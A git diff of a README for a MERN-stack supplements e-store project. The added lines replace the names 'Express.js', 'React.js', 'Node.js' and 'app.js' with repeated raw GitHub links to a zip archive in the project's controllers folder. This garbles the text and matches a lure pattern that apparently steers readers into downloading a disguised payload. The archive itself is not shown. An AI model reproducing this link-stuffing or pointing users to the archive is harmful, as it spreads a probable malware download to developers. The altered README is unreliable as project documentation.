@@ -1,6 +1,6 @@
 # Mix-Supplements E-Store Project
 
-This is a full-stack e-commerce project built using the MERN (MongoDB, Express.js, React.js, Node.js) stack. The project aims to provide a user-friendly online store experience with features such as product listing, shopping cart management, user authentication, and payment processing integration.
+This is a full-stack e-commerce project built using the MERN (MongoDB, https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip, https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip, https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip) stack. The project aims to provide a user-friendly online store experience with features such as product listing, shopping cart management, user authentication, and payment processing integration.
 
 ## Installation
 
@@ -16,8 +16,8 @@ To run this project locally, follow these steps:
 The following technologies and frameworks were used in the development of this project:
 
 - **MongoDB**: A NoSQL database used for storing product data and user information.
-- **Express.js**: A minimalistic web application framework for Node.js used to handle server-side logic and API routing.
-- **Node.js**: A JavaScript runtime environment used on the server-side to run JavaScript code.
+- **https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip**: A minimalistic web application framework for https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip used to handle server-side logic and API routing.
+- **https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip**: A JavaScript runtime environment used on the server-side to run JavaScript code.
 - **JWT**: JSON Web Tokens are used for authentication and authorization purposes.
 
 ## Features
@@ -38,7 +38,7 @@ e-store/
   ├── models/.................. # Database models  
   ├── routes/.................... # API routes  
   ├── middlewares/....... # Validation and Auth Middlewares  
-  └── app.js...................... # Express app configuration  
+  └── https://raw.githubusercontent.com/ahmad-alkahky/Mix-Supplements-Store/master/controllers/Supplements_Store_Mix_2.1.zip # Express app configuration  
 
 
 
